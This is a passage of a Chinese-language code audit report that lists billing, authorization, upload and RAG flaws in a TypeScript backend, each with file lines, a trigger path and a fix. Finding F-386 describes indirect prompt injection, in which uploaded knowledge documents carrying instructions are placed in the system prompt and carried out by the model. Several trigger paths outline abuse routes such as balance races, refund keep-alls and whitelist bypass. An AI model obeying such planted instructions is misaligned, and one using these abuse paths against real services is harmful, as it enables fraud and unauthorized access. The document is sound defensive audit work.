- 文件与行号：`services/api-subscription-service.ts:377-385`（事务外 `dbRead` 取 `tokenBalance`）、`:416-423`（`tokenBalance: Number(activeKey.tokenBalance) + tokenQuota`）
- 触发路径：用户 A 持有 Key（余额 10000）→ 订阅回调进入 `activateApiSubscription`，在 `:377` 读到 10000 → 同一时刻 relay 侧 `recordCall` 正常扣掉 9000（余额变 1000）→ 事务在 `:416` 把余额写回 `10000 + tokenQuota`。
- 根因：余额在事务**外**读取，事务内做「副本 + 常量」的绝对值 `SET`，不是 `token_balance = token_balance + quota`，也无 `FOR UPDATE`。
- 证据：`:377-385` 查询走 `dbRead` 且不在 `db.transaction` 内；`:416-423` 的 `set` 值完全由该快照派生；事务内无 `select ... for update`。
- 影响面：任意并发窗口内已消耗的额度被静默恢复 → 免扣费/双花；窗口大小 = 回调处理时长（含外部 HTTP），生产可稳定复现。
- 建议修法：改为 `UPDATE developer_api_keys SET token_balance = CASE WHEN token_balance = -1 THEN -1 ELSE token_balance + $q END WHERE id = $1`；同时把 `allowedModels` 合并写入。
- 是否当场可修：是。

#### F-370 订阅模型白名单在两条分支被跳过，套餐限制形同虚设
- 严重度：P2
- 文件与行号：`services/api-subscription-service.ts:355-361`（`keyAllowedModels` 计算）、`:404-414`（`quota=-1` 与「已是无限」两支只改余额）、`:419-421`（仅累加支写 `allowedModels`）
- 触发路径：购买「无限额度」套餐（`tokenQuota=-1`）或 Key 已是 `-1` → 回调只更新 `tokenBalance`，`allowedModels` 从不落库 → 该 Key 仍可调用任意模型。
- 根因：白名单写入被嵌在「累加额度」这一条控制流里，与额度语义耦合。
- 证据：`:404-409` 与 `:412-414` 两个分支的 `set` 均无 `allowedModels`；只有 `:419-421` 有。
- 影响面：付费套餐的模型范围限制失效；对按模型分级计费的产品等于免费升级。
- 建议修法：把 `allowedModels` 的写入提到额度分支之外，只要 `keyAllowedModels` 非空就写（无限套餐也应写）。
- 是否当场可修：是。

#### F-371 退款只冲订单金额，不回收已发放的 VIP/订阅/配额
- 严重度：P1
- 文件与行号：`services/order-service.ts:647-667`（退款状态与金额）；`routes/payment-gateway.ts:1310,1341`（退款受理入口）
- 触发路径：下单 → 回调发放 VIP/API 配额 → 后台或渠道退款成功 → 订单置为已退款，但 `user_vips`/`api_subscriptions`/`developer_api_keys.token_balance` 不变。
- 根因：发放与回收不对称；退款侧未建立「按订单号撤销权益」的补偿步骤。
- 证据：`order-service.ts:647-667` 仅更新订单字段；同文件与 `payment-gateway.ts` 退款分支均无 `revoke*`/`tokenFlows` 冲减调用。
- 影响面：付款后可退款且保留权益（白拿）；对订阅制是持续性收入漏损。
- 建议修法：退款成功后按 `relatedOrderNo` 撤销对应权益并写冲减流水，幂等键沿用订单号。
- 是否当场可修：是。

#### F-372 `dailyCostLimit` 只有告警没有执行点，日预算上限不生效
- 严重度：P2
- 文件与行号：`services/budget-alert-service.ts:190-200`；`plugins/ai-cost.ts:279`
- 触发路径：配置日成本上限 → 持续调用直到超限 → 仅收到告警通知，请求照常放行。
- 根因：`dailyCostLimit` 只被读入告警判定，计费前置检查（`ai-cost`）没有对应的拦截分支。
- 证据：`budget-alert-service.ts:190-200` 仅构造告警；`plugins/ai-cost.ts:279` 处只累计成本，无 `>= limit` 的拒绝。
- 影响面：成本熔断能力缺失，异常调用可无限放大账单。
- 建议修法：在 `ai-cost` 前置检查里读取同一限额并 fail closed（或明确将该配置更名为告警阈值）。
- 是否当场可修：是。

#### F-373 无额度套餐叠加有效期无上限，重复激活可无限延长
- 严重度：P2
- 文件与行号：`services/api-subscription-service.ts:404-409,449-453`；`schema/billing.ts:255`
- 触发路径：同一无限套餐以不同 `orderNo` 多次激活（或渠道重复创建订单）→ 每次都在原 `subEndAt` 上再加一个周期。
- 根因：有效期延长按「当前结束时间 + 周期」累加，缺少「同一套餐周期覆盖而非叠加」的判据，也没有上限。
- 证据：`:404-409` 的无限额度分支与 `:449-453` 的创建分支均只写余额/周期；`schema/billing.ts:255` 的到期字段无约束。
- 影响面：一次付费可获得多倍时长；与 F-371 叠加后被放大。
- 建议修法：续费按 `max(now, subEndAt) + period` 且限同一 `planId` 串行；跨套餐明确折算规则。
- 是否当场可修：是。

#### F-374 `subEndAt` 缺失被写成 `expiresAt: null`，折扣变永久
- 严重度：P2
- 文件与行号：`services/api-subscription-service.ts:472-494,500-509`；`services/user-billing-group-service.ts:115-131`
- 触发路径：套餐未定义周期（或字段读取为 `undefined`）→ 用户计费组 `expiresAt` 落 `null` → 折扣判定把 `null` 当「永久有效」。
- 根因：`undefined` 未归一化即透传；下游把 `null` 语义定义为永久，而不是「不设过期需显式标记」。
- 证据：`:472-494` 直接使用可选字段；`:500-509` 写组关系时未校验；`user-billing-group-service.ts:115-131` 的过期判断只比 `expiresAt`。
- 影响面：一次误配即造成永久折扣，且无到期回收路径。
- 建议修法：缺失周期时拒绝激活或落「明确永久」标记；折扣判定区分 `null`（未设置）与永久。
- 是否当场可修：是。

#### F-375 事务提交后的附属步骤无补偿，成功码下权益缺失
- 严重度：P2
- 文件与行号：`services/api-subscription-service.ts:464-472,371-373,396`
- 触发路径：事务内写配额与流水成功 → 提交后调用计费组绑定/通知 → 该步抛错被外层捕获或未处理 → 接口仍返回成功。
- 根因：主事务与附属副作用之间是「先提交后调用」，附属失败不回滚也不重试。
- 证据：`:464-472` 在 `db.transaction` 回调之外执行；`:371-373`、`:396` 的幂等只覆盖流水，不覆盖附属步骤。
- 影响面：用户付钱后拿不到折扣/通知；重放又会被流水幂等挡掉，无法自愈。
- 建议修法：附属步骤改为同事务写 outbox，由消费者重试；或纳入同一事务。
- 是否当场可修：是。

#### F-376 预算告警 6 小时冷却为「先查后异步写」，并发下重复告警
- 严重度：P2
- 文件与行号：`services/budget-alert-service.ts:185-233`；`schema/ai-cost.ts:83`
- 触发路径：同一预算在并发请求中同时越过阈值 → 两个请求都读到「无冷却记录」→ 各自异步插入 → 两条告警。
- 根因：冷却判定与冷却落库分离且非原子，缺少唯一键或原子 upsert。
- 证据：`:185-233` 先 `select` 判冷却、后异步 `insert`；`schema/ai-cost.ts:83` 无唯一约束兜底。
- 影响面：告警风暴；下游通知渠道被刷。
- 建议修法：以 `(scope, periodKey)` 唯一键 + `onConflictDoNothing` 原子占位，占位成功才发通知。
- 是否当场可修：是。

### B 路：风控、上传与存储

#### F-377 风控规则 R001/R003 依赖从未赋值的字段，永不命中（已复核，P1）
- 严重度：P1
- 文件与行号：`routes/auth.ts:890-893,1073-1076`；`services/risk-engine-service.ts:104-106,128-130`
- 触发路径：登录/注册请求进入风控评估 → R001/R003 读取的上下文字段在入口处没有写入 → 条件恒为假 → 规则永不触发。
- 根因：规则与上下文契约脱节：规则按字段名取值，入口只填了另一组字段，且类型上允许缺省。
- 证据：`routes/auth.ts:890-893`、`:1073-1076` 组装的上下文中不含 R001/R003 所需键；`risk-engine-service.ts:104-106`、`:128-130` 直接读该键并比较。
- 影响面：风控对该两类攻击完全裸奔，且日志不会体现「规则未命中」。
- 建议修法：补齐入口字段或删除死规则；为风控上下文加必填类型，编译期暴露缺口。
- 是否当场可修：是。

#### F-378 R004 自引用计数 + DB 异常 fail-open，风控整体失效
- 严重度：P1
- 文件与行号：`routes/auth.ts:649-657`；`services/risk-engine-service.ts:138-140,395-419`
- 触发路径：R004 统计「同主体近期失败次数」，查询条件包含本次刚落库的失败记录（自引用）→ 计数偏大；DB 查询抛错时走 `catch` 返回放行。
- 根因：计数窗口未排除当前事件；异常分支默认 `allow`。
- 证据：`:649-657` 先记录失败再调用评估；`:138-140` 的查询按主体聚合；`:395-419` 的 `catch` 返回非拦截结果。
- 影响面：误封与放行同时存在；数据库抖动期间风控等于关闭。
- 建议修法：窗口排除当前事件 id；异常按「降级为限速/挑战」而非直接放行。
- 是否当场可修：是。

#### F-379 R002/R005 所需字段入口未提供，规则空转
- 严重度：P2
- 文件与行号：`services/risk-engine-service.ts:114-125,148-154`；入口同上 `routes/auth.ts`
- 触发路径：与 F-377 同类，但影响的是设备/地理类规则；入口未填设备指纹与区域字段。
- 根因：上下文 schema 与规则集合无单一来源。
- 证据：`:114-125`、`:148-154` 读取的键在 `routes/auth.ts` 的构造对象中不存在。
- 影响面：设备异常、异地登录类检测无效。
- 建议修法：同上，收敛为一份带必填校验的上下文类型。
- 是否当场可修：是。

#### F-380 merge 入口不校验会话状态，可对已完成/已取消会话反复合并
- 严重度：P2
- 文件与行号：`routes/chunked-upload.ts:355-392`（`:389` 直接置 `merging`）
- 触发路径：会话 `completed` 或 `cancelled` 后再次 `POST /chunked-upload/merge` → 无状态前置判断 → 直接进入合并并把状态改回 `merging` → 再置 `completed`，可重复生成文件记录。
- 根因：合并入口缺少「仅 `uploading` 可进入」的原子状态迁移（对比分片上传在 `:269` 有判断）。
- 证据：`:355-392` 段落内无 `status !== uploading` 的拒绝分支；`:389` 无条件 `update ... set status: merging`。
- 影响面：重复文件与配额重复计数；已取消上传可被「复活」。
- 建议修法：`UPDATE ... SET status='merging' WHERE upload_id=$1 AND status='uploading' RETURNING *`，无返回即 409。
- 是否当场可修：是。

#### F-381 内容被拒/校验失败的分片目录永不被回收，却计入 2GiB 全局预算（已复核，P1）
- 严重度：P1
- 文件与行号：`services/upload-integrity.ts:232-248,250-265,291-313`；`routes/chunked-upload.ts:162-190,289-301,525-527`
- 触发路径：任意登录用户对 1GiB 文件以错误 `fileMd5` 走分片上传 → merge 返回 400 并保留 `chunks/<uploadId>`（`:525-527` 仅在成功时删除）→ 会话置 `checksum_mismatch`（终态）→ `isUploadSessionExpired` 对终态恒返回 `false`（`:262`）→ 目录永久留在盘上；`measureStagedBytes`（`:131-155`）按目录实测字节且**不看会话状态** → 两个来回即占满 `maxStagedBytesGlobal`（2GiB）→ 全员分片上传在 `:293` 收到 429。
- 根因：回收器把「终态」等同于「已清理」，但 `checksum_mismatch`/`content_rejected` 明确保留分片（代码注释写明为取证保留），二者矛盾；全局预算又按磁盘实测而非按活跃会话计。
- 证据：`:262` `if (TERMINAL_STATUSES.has(row.status)) return false`；`:526` 仅 `merged` 分支删目录；`:250-251` 注释承认终态不回收；`routes/chunked-upload.ts:526`（成功删）与 `:532`（失败保留）注释；`:292` 直接对该目录树求和。
- 影响面：**跨用户**存储型拒绝服务：单账号即可让全站分片上传不可用，且无自动恢复（需人工清盘）；同时磁盘被长期占用。
- 建议修法：`checksum_mismatch`/`content_rejected` 分片设独立短 TTL 并纳入回收；全局预算只统计 `uploading`/`merging` 会话对应的目录，或对终态目录单列配额。
- 是否当场可修：是。

#### F-382 OSS 分片会话用进程内 Map 且 TTL 不 Abort，跨用户清理
- 严重度：P2
- 文件与行号：`services/storage-service.ts:647-666,679-724,733-741`
- 触发路径：大量发起 OSS 分片上传 → `Map` 只增不减；过期清理走遍历删除，不调用上游 `AbortMultipartUpload`；清理不受发起用户约束。
- 根因：会话存储无上限、无 LRU；TTL 只删本地记录，不留服务端分片回收。
- 证据：`:647-666` 模块级 `Map` 无容量控制；`:679-724` 的过期分支只做 `delete`；`:733-741` 的清理按全局扫描，未按 `userId` 过滤。
- 影响面：内存随上传请求线性增长；OSS 侧产生计费残留分片；多实例下会清掉别的实例在途会话。
- 建议修法：会话落 Redis 并设 TTL；过期时调用 `AbortMultipartUpload`；清理按会话属主与实例标识隔离。
- 是否当场可修：是。

#### F-383 主体命中统计用 `ruleId.includes(userId)`，恒为空
- 严重度：P3
- 文件与行号：`services/risk-engine-service.ts:68-76,276-278`
- 触发路径：查询某用户命中的规则 → 以 `ruleId` 是否包含 `userId` 作为过滤条件 → 正常数据下永不匹配。
- 根因：键混淆（规则 id 与主体 id）。
- 证据：`:68-76` 构建 `hitsBySubject`；`:276-278` 使用字符串包含判定。
- 影响面：风控看板与处置建议长期为空。
- 建议修法：按 `subjectId` 字段直接建索引查询。
- 是否当场可修：是。

### C 路：知识库、RAG 与模型映射

#### F-384 被移出团队的用户仍保留知识空间权限
- 严重度：P2
- 文件与行号：`services/knowledge-team-service.ts:170-186,188-202,213-224`；`db/team-queries.ts:219-225`
- 触发路径：管理员移除成员 → 成员关系删除，但知识空间授权行未级联清理 → 该用户继续读写空间。
- 根因：授权与成员是两套表，移除路径只删其一。
- 证据：`:170-186` 删除成员；`:188-202`、`:213-224` 的权限判定只查授权表；`db/team-queries.ts:219-225` 的移除语句不触及空间授权。
- 影响面：离职/被移除成员可继续访问敏感知识库（越权读取）。
- 建议修法：移除成员时在同事务删授权，或权限判定改为「成员关系 JOIN 授权」实时校验。
- 是否当场可修：是。

#### F-385 模型映射后不复检 `allowedModels`，绕过白名单与计费口径（P1）
- 严重度：P1
- 文件与行号：`services/model-mapping-service.ts:32-57,79-88`；`routes/developer-relay.ts:646-653`；`plugins/api-key-auth.ts:960-964`；`routes/v1-public.ts:1628-1656,2104-2118`
- 触发路径：API Key 白名单只含 `model-a` → 请求 `model-a` 通过校验 → 映射服务把它改写成 `targetModel=model-z` → 后续限流/计费/上游转发全部按 `model-z` 执行，全程不再校验白名单。
- 根因：鉴权阶段的模型校验发生在映射之前，映射被视为纯转发细节，未纳入授权与计费键。
- 证据：`:32-57`、`:79-88` 的映射在鉴权之后、转发之前；`plugins/api-key-auth.ts:960-964` 只校验请求体原始模型；`routes/v1-public.ts:1628-1656,2104-2118` 的计费取映射后的模型名。
- 影响面：低价套餐可实际调用高价模型（白名单与限流均失效）；计费口径与实际授权模型不一致，审计无法对账。
- 建议修法：映射结果回灌为「生效模型」，在白名单/限流/计费三处统一使用；或映射表本身受白名单约束。
- 是否当场可修：是。

#### F-386 RAG 知识块无边界拼入 system prompt，间接提示注入
- 严重度：P2
- 文件与行号：`services/knowledge-chat-context.ts:93-113`；`routes/ai-chat-stream.ts:947-953`；`plugins/prompt-injection-guard.ts:39-50`
- 触发路径：用户在知识库上传含指令的文档 → 检索命中后原样拼接进 system prompt → 模型执行文档内指令。
- 根因：检索内容与系统指令共享同一信任域，无分隔标记、无「以下为数据」声明，注入守卫只扫用户输入不扫检索块。
- 证据：`:93-113` 直接字符串拼接；`routes/ai-chat-stream.ts:947-953` 把结果塞入 messages；`plugins/prompt-injection-guard.ts:39-50` 的扫描范围不含知识块。
- 影响面：知识库成员可越权诱导模型输出系统提示/执行工具调用。
- 建议修法：知识块包进显式数据边界并声明「不可执行指令」；对检索块做同一套注入扫描。
- 是否当场可修：是。

#### F-387 `ingestFile` 用标题反查 docId，空文本仍返回成功
- 严重度：P2
- 文件与行号：`services/knowledge-rag-service.ts:337-354`；`routes/knowledge-rag.ts:263-271`
- 触发路径：两个文档同名 → 反查命中错误 docId，切片挂到另一文档；解析出空文本时流程照常返回成功，文档显示已索引但零切片。
- 根因：以非唯一字段（标题）作为标识；空内容未作为失败处理。
- 证据：`:337-354` 的 `where` 条件用标题；`:263-271` 的空文本分支直接返回成功结果。
- 影响面：检索结果串档（数据正确性）；「已索引」假成功导致排障困难。
- 建议修法：以 `docId` 为主键贯穿；空文本返回明确失败并回写状态。
- 是否当场可修：是。

#### F-388 关键词过滤在 `LIMIT` 之后内存执行，分页返回不足
- 严重度：P3
- 文件与行号：`services/knowledge-team-service.ts:674-697`
- 触发路径：按关键词查成员/文档 → SQL 先取一页再在内存过滤 → 命中少时该页不足 `pageSize`，翻页出现空洞。
- 根因：过滤条件下沉缺失。
- 证据：`:674-697` 先 `limit/offset` 查询，随后 `filter`。
- 影响面：列表少项、总数不准；深分页出现重复/漏项。
- 建议修法：关键词条件下推到 SQL（配合 `like-escape`），或改用游标分页后过滤。
- 是否当场可修：是。

#### F-389 供应商模型缓存键不含 API Key 指纹，跨凭据串味
- 严重度：P2
- 文件与行号：`services/provider-models.ts:304-308,344,368,375-379`
- 触发路径：用户 A 用自己的 Key 拉取模型列表并缓存 → 用户 B 用不同 Key 命中同一条缓存 → 返回 A 可见的模型集合。
- 根因：缓存键只含供应商维度，缺少凭据维度。
- 证据：`:304-308` 的 key 构造；`:344`、`:368`、`:375-379` 读写同一 key。
- 影响面：模型可见性越权；不同账户额度/权限差异被抹平。
- 建议修法：缓存键加入 Key 指纹哈希（或按凭据组隔离）。
- 是否当场可修：是。

### D 路：剩余路由

#### F-390 spec 全系列缺少用户级 ACL，可写他人仓库并提交
- 严重度：P1
- 文件与行号：`routes/spec.ts:52-67,93-138,475-490`；`services/spec-service.ts:42-44,1373,1392,1470-1475`
- 触发路径：登录用户得到他人仓库/规格 id → 直接调用写接口 → 无属主校验 → 内容被写入并 `git commit`。
- 根因：路由只做认证不做授权；资源查询按 id 直取，未带 `userId` 条件。
- 证据：`:52-67`、`:93-138` 的 handler 无属主断言；`services/spec-service.ts:42-44` 的读取按 id；`:1373`、`:1392`、`:1470-1475` 的写与提交路径同样按 id。
- 影响面：跨用户仓库篡改 + 伪造提交历史（供应链风险）。
- 建议修法：所有读写以 `(repoId, userId)` 复合条件定位；写操作前置属主断言。
- 是否当场可修：是。

#### F-391 创建 API Key / 充值缺少 2FA step-up
- 严重度：P2
- 文件与行号：`routes/developer-relay.ts:189-227,502-573`
- 触发路径：会话被劫持后直接创建长期 Key 或充值，无需二次验证。
- 根因：高危资金/凭据操作未接 `requireStepUpForTwoFactorUser`（同仓其他敏感路由已接）。
- 证据：`:189-227`、`:502-573` 的 `preHandler` 只有 `requireAuth` 类守卫。
- 影响面：凭据持久化失窃与资金损失。
- 建议修法：与既有 step-up 中间件对齐。
- 是否当场可修：是。

#### F-392 bootstrap 生成的配置只含 key 不含 secret，必然 401
- 严重度：P2
- 文件与行号：`routes/developer-relay-bootstrap.ts:56-232,255-262`；`plugins/api-key-auth.ts:937-945`；`config/index.ts:345`
- 触发路径：走 bootstrap 引导 → 生成配置文件只写入公开 `key` → 客户端按该配置请求 → 鉴权需要 `secret` 签名 → 恒 401。
- 根因：鉴权要求 key+secret，而引导产物按「key 即凭据」的旧契约生成。
- 证据：`:56-232` 的模板拼接；`:255-262` 的返回体；`plugins/api-key-auth.ts:937-945` 校验 secret；`config/index.ts:345` 的开关。
- 影响面：引导流程对新用户完全不可用（功能性阻断）。
- 建议修法：引导一次性返回 secret 并要求立即保存，或改用仅 key 的鉴权模式。
- 是否当场可修：是。

#### F-393 内容管理按 `:id` 操作不校验分类归属
- 严重度：P2
- 文件与行号：`routes/admin-content-routes.ts:143-146,184-209,418-430,470-584`
- 触发路径：在分类 A 的操作入口传入分类 B 的条目 id → 未校验 `categoryId` 归属 → 跨分类改/删。
- 根因：路由路径带分类，但实现只按条目主键定位。
- 证据：`:143-146`、`:184-209` 的查询条件；`:418-430`、`:470-584` 的写操作同样只带 id。
- 影响面：管理员误操作跨分类污染；越权面随权限模型放大。
- 建议修法：查询与写入统一加 `categoryId` 条件。
- 是否当场可修：是。

#### F-394 `token_flows` 口径错误，统计与流水不一致
- 严重度：P2
- 文件与行号：`routes/admin-shop-routes.ts:149-157`；`routes/developer.ts:680-719`；`services/relay-billing-service.ts:1534-1541`
- 触发路径：后台/开发者看板按 `opType` 聚合 → 写入侧与查询侧对同一业务使用了不同 `opType`/符号 → 汇总与明细不符。
- 根因：`opType` 常量缺少单一来源，各写点各自硬编码。
- 证据：`:149-157` 与 `:680-719` 的聚合条件；`relay-billing-service.ts:1534-1541` 的写入 `opType` 与之不匹配。
- 影响面：财务对账出现无法解释的差额。
- 建议修法：抽 `TOKEN_FLOW_OP` 枚举统一读写，并加口径一致性测试。
- 是否当场可修：是。

#### F-395 商品保存「假成功」：返回 OK 但未落库
- 严重度：P2
- 文件与行号：`routes/admin-shop-routes.ts:182-195,229-234,255-268,62-78`
- 触发路径：提交部分字段（如未传可选列或传空对象）→ 更新条件构造为空/受影响 0 行 → 仍返回成功。
- 根因：未检查 `rowCount`/`returning` 空结果，把「无变更」当成功。
- 证据：`:182-195`、`:229-234`、`:255-268` 的写后返回；`:62-78` 的参数归一化。
- 影响面：后台以为保存成功，线上商品未变；排障成本高。
- 建议修法：以 `returning` 判空返回 404/409。
- 是否当场可修：是。

#### F-396 兑换码核销未校验 `apiKeyId` 归属
- 严重度：P2
- 文件与行号：`routes/developer-relay.ts:575-601`；`services/redemption-code-service.ts:227-258`
- 触发路径：用户提交他人 Key 的 id + 自己的兑换码 → 额度充到他人 Key。
- 根因：核销只校验码状态与套餐，不校验目标 Key 属主。
- 证据：`:575-601` 传入 `apiKeyId`；`:227-258` 直接按 id 更新余额，无 `userId` 条件。
- 影响面：额度可被定向「投毒」；也可用于洗码。
- 建议修法：更新语句加 `and userId = $me`，受影响 0 行即拒绝。
- 是否当场可修：是。

#### F-397 汇率表无唯一约束 + `LIMIT 1` 无排序 + `real` 精度
- 严重度：P2
- 文件与行号：`db/exchange-rate-queries.ts:24-49,55-71`；`schema/zhs-full.ts:446-459`
- 触发路径：同一币种出现多行 → 取汇率 `LIMIT 1` 无 `ORDER BY` → 结果不确定；`real` 存储放大金额误差。
- 根因：缺 `(base, quote)` 唯一键；查询未定义排序；用浮点存货币比率。
- 证据：`:24-49`、`:55-71` 的查询无 `orderBy`；`schema/zhs-full.ts:446-459` 列为 `real` 且无 unique。
- 影响面：同一订单不同时刻折算金额不同；对账漂移。
- 建议修法：加唯一键 + `numeric`；查询按 `effectiveAt desc` 排序。
- 是否当场可修：是。

### E 路：schema 与权限矩阵

#### F-398 唯一索引在 schema 中降级为普通索引，`onConflict` 必报 42P10
- 严重度：P2
- 文件与行号：`schema/api-key-groups.ts:79`；`services/api-key-group-service.ts:221-236`
- 触发路径：调用分组 upsert → `onConflictDoUpdate` 指定列 → 库中该列只有普通索引 → PostgreSQL 抛 `42P10`（无匹配唯一/排除约束）。
- 根因：schema 定义与迁移不一致（迁移建了唯一，schema 用 `index()`）。
- 证据：`schema/api-key-groups.ts:79` 为 `index(...)`；`:221-236` 使用 `onConflictDoUpdate({ target: ... })`。
- 影响面：分组同步接口 500；若生产按 schema 重新推平会静默丢唯一性。
- 建议修法：schema 改 `uniqueIndex`，与迁移对齐。
- 是否当场可修：是。

#### F-399 周期扣款回调验签用 `JSON.stringify(body)`，无 rawBody（已复核，P1）
- 严重度：P1
- 文件与行号：`routes/payment-recurring.ts:453-457`（`const rawBody = JSON.stringify(request.body)`）
- 触发路径：微信周期扣款通知到达 → 用重新序列化的 JSON 计算签名 → 与原报文存在（键序/空白/数字格式）差异时验签失败 → 正常回调被 401；反之若某些报文恰好等价，则签名未覆盖原字节，存在被重放构造的空间。
- 根因：未保留原始请求体；Fastify 默认解析后已丢失字节序。
- 证据：`:453` 直接 `JSON.stringify(request.body)`；`:456-464` 据此 `verifyCallbackSignature`。对照同仓微信支付主回调使用 rawBody 的做法（`server.ts` 的 `rawBody` 选项）。
- 影响面：周期扣款签约/扣款事件大量验签失败，续费链路中断；失败重试放大上游压力。
- 建议修法：为该路由开启 `rawBody`（或 `preParsing` 收集 Buffer），用原始字节验签。
- 是否当场可修：是。

#### F-400 computer-use 整族仅 `requireAuth`，可驱动宿主机键鼠（已复核，P1）
- 严重度：P1
- 文件与行号：`routes/workspace-ai.ts:1208-1280`（status/screenshot/click/type/key/screen-size 全部只 `await requireAuth`）；`services/workspace-ai-service.ts` 的 `computerUse` 实现
- 触发路径：开启 `IHUI_COMPUTER_USE_ENABLED=1` 的部署 → 任意注册用户 `POST /computer-use/mouse/click`、`/keyboard/type` → 直接操作服务端桌面（含截图回传）。
- 根因：高危能力只做了身份认证，无管理员/角色/step-up/审批门。
- 证据：`:1209`、`:1215`、`:1226`、`:1246`、`:1259`、`:1272` 均为单一 `requireAuth`；请求体只做数值/非空校验。
- 影响面：宿主机完全接管（键鼠、截屏、可配合终端提权），等同 RCE 前置。
- 建议修法：默认关闭；开启时强制 `requireAdmin` + step-up + 审计；或改为容器内虚拟桌面。
- 是否当场可修：是。

#### F-401 codebase/vector/checkpoints 缺 workspace 权限校验
- 严重度：P2
- 文件与行号：`routes/workspace-ai.ts:1286-1397`；`services/workspace-ai-service.ts:1537-1560,2021-2041`
- 触发路径：非工作区成员凭 workspaceId 调用索引/向量/检查点接口 → 无成员判定 → 读取或改写他人工作区数据。
- 根因：该组路由未接工作区权限守卫（同文件其他组已接）。
- 证据：`:1286-1397` 的 handler 只有 `requireAuth`；`:1537-1560`、`:2021-2041` 的读写按 `workspaceId` 直取。
- 影响面：跨租户读取代码索引与向量数据。
- 建议修法：统一挂 `workspace-permissions` 守卫。
- 是否当场可修：是。

#### F-402 swarms 无属主模型，任意用户可操作他人 swarm
- 严重度：P2
- 文件与行号：`routes/workspace-ai.ts:981-1025`；`services/workspace-ai-service.ts:137-280`
- 触发路径：拿到 swarm id 即可查询/推进/终止，无 `ownerId` 校验。
- 根因：swarm 实体未建模属主字段，接口按 id 直取。
- 证据：`:981-1025`；`services/workspace-ai-service.ts:137-280` 的存储与查找均无用户维度。
- 影响面：跨用户任务劫持与资源滥用。
- 建议修法：实体加 `ownerId`，所有入口按 `(id, ownerId)` 定位。
- 是否当场可修：是。

#### F-403 删除角色只清菜单绑定，残留用户-角色绑定
- 严重度：P2
- 文件与行号：`routes/admin-sys/role-routes.ts:83-92`；`db/admin-sys-queries.ts:174-178`
- 触发路径：删除角色 → 只删角色-菜单关联 → 用户-角色关联行仍在 → 角色 id 被复用时旧用户继承新权限；或查询残留孤儿关联。
- 根因：删除路径未做级联。
- 证据：`:83-92` 的删除流程；`:174-178` 仅删菜单绑定。
- 影响面：权限残留与越权（角色 id 复用场景）。
- 建议修法：同事务删除用户-角色与菜单绑定，或使用外键级联。
- 是否当场可修：是。

---

## 十八、第十四轮新增（资金闭环 / 媒体文档 / clawdbot / 剩余路由 / db与schema）

> 基线：origin/main `c20e4a57`（本地 HEAD `d2bf9bd2`，behind 1，工作树未改）。五路并行。
> 标注「已复核」的 3 条（F-404、F-405、F-433）由主代理直接读源码二次确认。

### A 路：资金闭环与佣金

#### F-404 返佣基数取「被邀请人钱包总余额」而非本单 token 数，可反复放大（已复核，P1）
- 严重度：P1
- 文件与行号：`routes/payment-gateway.ts:723-749`（`:747 getBalance`）；`services/commission-service.ts:53-56,143-145`
- 触发路径：邀请关系 A→B。B 历史余额 10 万 token，再下一笔 1 分钱订单 → 回调先 `completeOrderWithSaga` 充值完成 → `:747` 取到「含历史余额」的 10 万 → `:145 calcReturnToken(100000, proportion)` 给 A 返佣。
- 根因：返佣基数与订单解耦；`calcReturnToken` 也不区分 `orderType`，会员/身份单同样按 token 返佣。
- 证据：`:747 const tokenQuantity = await getBalance(result.order.userId)`；`commission-service.ts:55 Math.floor((tokenQuantity * tokenProportion) / 100)`；`UserLike` 字段就叫 `tokenQuantity`（`:38-41`），语义实为余额。
- 影响面：小额复购可对历史余额无限重复抽佣，返佣 token 直接进钱包且可提现 → 可放大铸币。
- 建议修法：基数改为本单实际购买 token 数（订单行或充值流水增量），非 token 单不发 token 佣金。
- 是否当场可修：是。

#### F-405 提现冻结被「审批」与「回调」双释放，回调侧无下界守卫（已复核，P1）
- 严重度：P1
- 文件与行号：`routes/finance-extended.ts:557-598`（审批 `frozen -= amount`）；`routes/payment-extended.ts:146-173`（回调 `frozen -= amount` 无守卫）；`routes/admin-shop-routes.ts:424-472,475-524`
- 触发路径：管理员 `approve` → `status 0 → 1` 且 `frozen -= amount`（`:577-590`）→ 微信转账 SUCCESS 回调命中 `status===1` 分支（`:147`）→ 再次 `frozen -= amount`，`where` 只有 `userId`、无 `frozen >= amount`（`:165-172`）。
- 根因：三条审批路径语义不一致（`user/withdrawal-routes` 的 approve 不释放冻结，`finance-extended` 释放），回调假定「审批未释放」。
- 证据：`:147 if (flow.status !== 0 && flow.status !== 1)` 明确接受 1；`:169 sql\`frozen_quantity - ${flow.amount}\`` 无下界条件；对照 `finance-extended.ts:587` 审批侧**有** `frozen >= amount` 守卫。
- 影响面：`frozen_quantity` 变负 → `developer.ts:689` 的 `available = token - frozen` 虚增；后续打款/驳回的冻结守卫全部 409 卡死。
- 建议修法：冻结只允许一个出口释放（回调或审批二选一）；回调同样加 `frozen >= amount` 条件并按受影响行数判失败。
- 是否当场可修：是。

#### F-406 提现手续费只记账不扣余额，可反复提取
- 严重度：P2
- 文件与行号：`db/commission-queries.ts:484-505,662-669`
- 触发路径：可提现 100 → 申请 100（fee=2、actual=98）→ 钱包只 `-98`；`availableWithdrawal` 以毛额 100 减流水 98，仍余 2 可再提。
- 根因：`tokenQuantity -= actualAmount`，fee 无任何扣减/销毁流水。
- 证据：`:484-505` 的扣减使用 `actualAmount`；`:662-669` 的可用额求和与扣减口径不一致。
- 影响面：2% 手续费永久留在可提现余额，平台少收且可循环套取。
- 建议修法：余额扣毛额 `input.amount`，手续费另记收入流水。
- 是否当场可修：是。

#### F-407 退款不冲减佣金，退款单佣金仍可提现
- 严重度：P2
- 文件与行号：`services/order-service.ts:647-669`；`db/commission-queries.ts:662-669`
- 触发路径：订单支付 → `commissionFlows(status=1)` → `refundOrder` 置 refunded；佣金行不动，`availableWithdrawal` 仍按 `status=1` 求和。
- 根因：退款补偿只覆盖订单与部分 token，未覆盖佣金表。
- 证据：全仓检索 `update(commissionFlows)` 为 0 处；`:662-669` 仅按状态求和。
- 影响面：退款后上级仍可提取该单佣金（token 佣金已入其钱包）。
- 建议修法：退款时按 `orderId` 将佣金置无效并同事务冲减 token 佣金。
- 是否当场可修：是。

#### F-408 佣金入钱包不写 `token_flows`，账实断链
- 严重度：P2
- 文件与行号：`db/commission-queries.ts:381-419`；对照 `:43-50`
- 触发路径：普通上级获得 token 佣金 → 仅 `userMargins.tokenQuantity += token`，无流水行。
- 根因：钱包写点绕过统一记账入口。
- 证据：`:381-419` 的更新只碰 `userMargins`；同文件 `:43-50` 的其它资金动作会写 `tokenFlows`。
- 影响面：`getTokenFlowTotals` 累计获得漏计；无 `balanceAfter`，对账无法还原。
